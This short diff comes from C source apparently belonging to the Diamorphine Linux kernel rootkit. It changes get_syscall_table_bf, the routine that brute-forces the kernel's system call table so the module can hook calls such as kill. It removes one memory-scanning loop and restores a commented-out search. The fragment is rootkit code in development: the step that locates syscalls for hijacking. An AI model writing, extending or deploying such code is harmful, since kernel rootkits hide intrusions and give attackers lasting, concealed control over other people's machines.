@@ -38,12 +38,6 @@ orig_kill_t orig_kill;
 unsigned long *
 get_syscall_table_bf(void)
 {
-	unsigned long *syscall_table = (unsigned long *)START_MEM;
-
-	while (syscall_table[__NR_close] != (unsigned long)sys_close)
-		syscall_table++;
-	return syscall_table;
-/*
 	unsigned long *syscall_table;
 	unsigned long int i;
 
@@ -54,7 +48,6 @@ get_syscall_table_bf(void)
 			return syscall_table;
 	}
 	return NULL;
-*/
 }
 
 #define MAGIC_PREFIX "diamorphine"
